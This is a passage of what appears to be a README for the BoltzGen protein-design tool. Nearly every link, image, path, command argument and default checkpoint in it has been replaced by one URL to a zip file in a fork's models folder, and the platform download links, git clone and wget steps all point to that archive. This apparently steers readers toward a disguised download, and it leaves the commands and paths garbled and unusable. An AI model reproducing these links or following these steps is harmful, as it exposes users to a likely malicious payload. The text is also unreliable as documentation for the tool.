...
<div align="center">
  <div>&nbsp;</div>
  <img src="https://raw.githubusercontent.com/Cassis-P/boltzgen/main/src/boltzgen/model/models/Software-v3.2.zip" alt="BoltzGen logo" width="60%">

[Paper](https://raw.githubusercontent.com/Cassis-P/boltzgen/main/src/boltzgen/model/models/Software-v3.2.zip) | 
[Slack](https://raw.githubusercontent.com/Cassis-P/boltzgen/main/src/boltzgen/model/models/Software-v3.2.zip) <br> <br>
 ![alt text](https://raw.githubusercontent.com/Cassis-P/boltzgen/main/src/boltzgen/model/models/Software-v3.2.zip)
</div>
...
* **Windows:** <https://raw.githubusercontent.com/Cassis-P/boltzgen/main/src/boltzgen/model/models/Software-v3.2.zip>
* **macOS / Linux:** <https://raw.githubusercontent.com/Cassis-P/boltzgen/main/src/boltzgen/model/models/Software-v3.2.zip>
...
docker run --rm --gpus all -v "$(realpath workdir)":/workdir -v "$(realpath cache)":/cache -v "$(realpath example)":/example \
  boltzgen run https://raw.githubusercontent.com/Cassis-P/boltzgen/main/src/boltzgen/model/models/Software-v3.2.zip --output /workdir/test \
...
⚠️ it downloads models (~6GB) to `~https://raw.githubusercontent.com/Cassis-P/boltzgen/main/src/boltzgen/model/models/Software-v3.2.zip`. This can by changed by passing `--cache YOUR_PATH` or by setting `$HF_HOME`.\
⚠️ If your run is ever interrupted, you can restart it with `--reuse`. No progress is lost.


```bash
boltzgen run https://raw.githubusercontent.com/Cassis-P/boltzgen/main/src/boltzgen/model/models/Software-v3.2.zip \
...
1. Make your `.yaml` file that specifies your target and what you want to design. We provide many examples in
   `example` such as `https://raw.githubusercontent.com/Cassis-P/boltzgen/main/src/boltzgen/model/models/Software-v3.2.zip`. Details in
...
2. Check whether your design specification is as intended.  
   1. Run `boltzgen check https://raw.githubusercontent.com/Cassis-P/boltzgen/main/src/boltzgen/model/models/Software-v3.2.zip`.  
   2. Visualize the resulting mmcif file in a protein structure viewer (e.g. PyMOL, Chimera, or online: https://raw.githubusercontent.com/Cassis-P/boltzgen/main/src/boltzgen/model/models/Software-v3.2.zip).
...
4. Your filtered, ranked set of designs will be in `--output`. <img src="https://raw.githubusercontent.com/Cassis-P/boltzgen/main/src/boltzgen/model/models/Software-v3.2.zip" alt="Seconds per design" align="right" width="35%">
5. You likely want to rerun the filtering step with different settings (takes ~15 sec). Use
   `boltzgen run --steps filtering --output ...` or the Jupyter notebook `https://raw.githubusercontent.com/Cassis-P/boltzgen/main/src/boltzgen/model/models/Software-v3.2.zip` which is often more convenient.
...
- `config/`, `https://raw.githubusercontent.com/Cassis-P/boltzgen/main/src/boltzgen/model/models/Software-v3.2.zip`: configuration files.
...
- `intermediate_designs_inverse_folded/`: output of inverse folding, folding, and analysis steps
  ...
  - `https://raw.githubusercontent.com/Cassis-P/boltzgen/main/src/boltzgen/model/models/Software-v3.2.zip`, `https://raw.githubusercontent.com/Cassis-P/boltzgen/main/src/boltzgen/model/models/Software-v3.2.zip` — outputs of the analysis step.
- `final_ranked_designs/` : outputs of the filtering step
  ...
  - `https://raw.githubusercontent.com/Cassis-P/boltzgen/main/src/boltzgen/model/models/Software-v3.2.zip` — metrics for all designs considered by filtering.
  - `/final_designs_metrics_<budget>.csv` — metrics for the selected final set.
  - `https://raw.githubusercontent.com/Cassis-P/boltzgen/main/src/boltzgen/model/models/Software-v3.2.zip` — plots
...
A more detailed explanation of how our <code>.yaml</code> design specification files work is in <a href="https://raw.githubusercontent.com/Cassis-P/boltzgen/main/src/boltzgen/model/models/Software-v3.2.zip" target="_blank">https://raw.githubusercontent.com/Cassis-P/boltzgen/main/src/boltzgen/model/models/Software-v3.2.zip</a>. Below is an example based explanation, which is sufficient for most tasks.
...
You can check the indexing in your mmcif file by opening it in https://raw.githubusercontent.com/Cassis-P/boltzgen/main/src/boltzgen/model/models/Software-v3.2.zip, hovering over a residue, and checking the index on the bottom right. You will see something like this where **41 is the index we use, the auth id 22 is incorrect**:

![](https://raw.githubusercontent.com/Cassis-P/boltzgen/main/src/boltzgen/model/models/Software-v3.2.zip)
...
entities:
  ...
  - file:
      ...
      path: https://raw.githubusercontent.com/Cassis-P/boltzgen/main/src/boltzgen/model/models/Software-v3.2.zip # .pdb files also work
...
using a [jupyter notebook](https://raw.githubusercontent.com/Cassis-P/boltzgen/main/src/boltzgen/model/models/Software-v3.2.zip) that we provide. In most cases the notebook is more convenient. If you'd prefer to use the command-line, here is an example of re-running the filters without the notebook.
...
- `--config CONFIG [CONFIG ...]` - Override pipeline step configuration, in format `<step_name> <arg1>=<value1> <arg2>=<value2> ...` (example: `--config folding num_workers=4 https://raw.githubusercontent.com/Cassis-P/boltzgen/main/src/boltzgen/model/models/Software-v3.2.zip`). Can be used multiple times.
...
- `--moldir MOLDIR` - Path to the moldir. Default: `https://raw.githubusercontent.com/Cassis-P/boltzgen/main/src/boltzgen/model/models/Software-v3.2.zip`
...
- `--design_checkpoints DESIGN_CHECKPOINTS [DESIGN_CHECKPOINTS ...]` - Path to the boltzgen checkpoint(s). One or more checkpoints are supported. Just specifying an individual path here will work. Each will be used for an equal fraction of the designs. By default, two checkpoints are used. Default: `['https://raw.githubusercontent.com/Cassis-P/boltzgen/main/src/boltzgen/model/models/Software-v3.2.zip', 'https://raw.githubusercontent.com/Cassis-P/boltzgen/main/src/boltzgen/model/models/Software-v3.2.zip']`
...
- `--inverse_fold_checkpoint INVERSE_FOLD_CHECKPOINT` - Path or huggingface repo and filename for the inverse fold checkpoint. Default: `https://raw.githubusercontent.com/Cassis-P/boltzgen/main/src/boltzgen/model/models/Software-v3.2.zip`
...
- `--folding_checkpoint FOLDING_CHECKPOINT` - Path to the folding checkpoint. Default: `https://raw.githubusercontent.com/Cassis-P/boltzgen/main/src/boltzgen/model/models/Software-v3.2.zip`
- `--affinity_checkpoint AFFINITY_CHECKPOINT` - Path to the affinity predictor checkpoint. Default: `https://raw.githubusercontent.com/Cassis-P/boltzgen/main/src/boltzgen/model/models/Software-v3.2.zip`
...
- `--cache CACHE` - Directory where downloaded models will be stored. Default: `~https://raw.githubusercontent.com/Cassis-P/boltzgen/main/src/boltzgen/model/models/Software-v3.2.zip`
...
Downloaded weights and datasets are stored in `~https://raw.githubusercontent.com/Cassis-P/boltzgen/main/src/boltzgen/model/models/Software-v3.2.zip` by default but this can be changed by specifying `--cache`.
...
### Example
```bash
boltzgen configure https://raw.githubusercontent.com/Cassis-P/boltzgen/main/src/boltzgen/model/models/Software-v3.2.zip \
...
```bash
git clone https://raw.githubusercontent.com/Cassis-P/boltzgen/main/src/boltzgen/model/models/Software-v3.2.zip
pip install -e .[dev]
```
...
# ─ Targets ─
wget -O https://raw.githubusercontent.com/Cassis-P/boltzgen/main/src/boltzgen/model/models/Software-v3.2.zip "https://raw.githubusercontent.com/Cassis-P/boltzgen/main/src/boltzgen/model/models/Software-v3.2.zip"
unzip https://raw.githubusercontent.com/Cassis-P/boltzgen/main/src/boltzgen/model/models/Software-v3.2.zip      # → training_data/targets/

# ─ MSAs  ─
wget -O https://raw.githubusercontent.com/Cassis-P/boltzgen/main/src/boltzgen/model/models/Software-v3.2.zip "https://raw.githubusercontent.com/Cassis-P/boltzgen/main/src/boltzgen/model/models/Software-v3.2.zip"
unzip https://raw.githubusercontent.com/Cassis-P/boltzgen/main/src/boltzgen/model/models/Software-v3.2.zip          # → training_data/msa/

# ─ Small-molecule dictionary ─
wget -O https://raw.githubusercontent.com/Cassis-P/boltzgen/main/src/boltzgen/model/models/Software-v3.2.zip "https://raw.githubusercontent.com/Cassis-P/boltzgen/main/src/boltzgen/model/models/Software-v3.2.zip"
unzip https://raw.githubusercontent.com/Cassis-P/boltzgen/main/src/boltzgen/model/models/Software-v3.2.zip         # → training_data/mols/
...
wget -O https://raw.githubusercontent.com/Cassis-P/boltzgen/main/src/boltzgen/model/models/Software-v3.2.zip \
  "https://raw.githubusercontent.com/Cassis-P/boltzgen/main/src/boltzgen/model/models/Software-v3.2.zip"
```
Resulting layout
```
training_data/
 ...
 ├─ https://raw.githubusercontent.com/Cassis-P/boltzgen/main/src/boltzgen/model/models/Software-v3.2.zip    (used for folding_checkpoint in yaml) 
 └─ https://raw.githubusercontent.com/Cassis-P/boltzgen/main/src/boltzgen/model/models/Software-v3.2.zip   (used for pretrained in yaml)
```
...
|-------------|---------|-----------------|
| `https://raw.githubusercontent.com/Cassis-P/boltzgen/main/src/boltzgen/model/models/Software-v3.2.zip` | Train the **small** Boltzgen model (recommended for development, 8 GPUs, gradient accumulation 16) | `python https://raw.githubusercontent.com/Cassis-P/boltzgen/main/src/boltzgen/model/models/Software-v3.2.zip https://raw.githubusercontent.com/Cassis-P/boltzgen/main/src/boltzgen/model/models/Software-v3.2.zip  name=boltzgen_small` |
| `https://raw.githubusercontent.com/Cassis-P/boltzgen/main/src/boltzgen/model/models/Software-v3.2.zip` | Train the **large** BoltzGen model | `python https://raw.githubusercontent.com/Cassis-P/boltzgen/main/src/boltzgen/model/models/Software-v3.2.zip https://raw.githubusercontent.com/Cassis-P/boltzgen/main/src/boltzgen/model/models/Software-v3.2.zip        name=boltzgen_large` |
| `https://raw.githubusercontent.com/Cassis-P/boltzgen/main/src/boltzgen/model/models/Software-v3.2.zip` | Train the **inverse-folding** model only | `python https://raw.githubusercontent.com/Cassis-P/boltzgen/main/src/boltzgen/model/models/Software-v3.2.zip https://raw.githubusercontent.com/Cassis-P/boltzgen/main/src/boltzgen/model/models/Software-v3.2.zip name=boltzgen_if` |
...
pretrained: https://raw.githubusercontent.com/Cassis-P/boltzgen/main/src/boltzgen/model/models/Software-v3.2.zip

folding_checkpoint: https://raw.githubusercontent.com/Cassis-P/boltzgen/main/src/boltzgen/model/models/Software-v3.2.zip
```
...
python https://raw.githubusercontent.com/Cassis-P/boltzgen/main/src/boltzgen/model/models/Software-v3.2.zip https://raw.githubusercontent.com/Cassis-P/boltzgen/main/src/boltzgen/model/models/Software-v3.2.zip \
       name=boltzgen_small
```
